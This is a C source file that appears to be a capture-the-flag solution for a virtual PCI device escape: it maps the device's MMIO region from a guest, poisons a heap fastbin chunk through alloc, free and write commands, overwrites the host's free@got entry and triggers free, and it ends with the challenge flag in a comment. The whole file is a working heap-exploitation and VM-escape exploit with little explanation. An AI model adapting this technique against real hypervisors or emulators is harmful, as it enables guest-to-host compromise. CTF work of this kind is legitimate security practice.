#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>

uint8_t* iomem;

void iowrite(uint64_t addr, uint32_t value) 
{
    *((uint32_t*)(iomem + addr)) = value;
}

void mmio_alloc(uint64_t index, uint64_t size) 
{
    uint64_t op = 0 << 20;
    uint64_t idx = (index & 0xf) << 16;
    iowrite(op | idx, size / 8);
}

void mmio_free(uint64_t index) 
{
    uint64_t op = 1 << 20;
    uint64_t idx = (index & 0xf) << 16;
    iowrite(op | idx, 0);
}

void mmio_write(uint64_t index, uint64_t offset, uint32_t val) 
{
    uint64_t op = 2 << 20;
    uint64_t idx = (index & 0xf) << 16;
    iowrite(op | idx | (offset & 0xffff), val);
}

void write64(uint64_t index, uint64_t offset, uint64_t val) 
{
    mmio_write(index, offset, (uint32_t)val);
    mmio_write(index, offset + 4, (uint32_t)(val >> 32));
}

int main()
{
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC, 0);
    if (fd == -1)
        perror("open failed");

    iomem = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (iomem == MAP_FAILED)
        perror("mmap");

    printf("map @ %p\n", iomem);

    // make a fasbin chunk and overwrite it's fd
    mmio_alloc(0, 0x58);
    mmio_free(0);
    write64(0, 0, 0x112ef7b);

    // alloc to get evil chunk
    mmio_alloc(1, 0x58);
    mmio_alloc(2, 0x58); // @ 0x112ef8b

    // overwrite free@got
    write64(2, 0x11301a0-0x112ef8b, 0x6E6614);

    // triger free
    mmio_free(0);

    return 0;
}

// OOO{did you know that the cloud is safe}

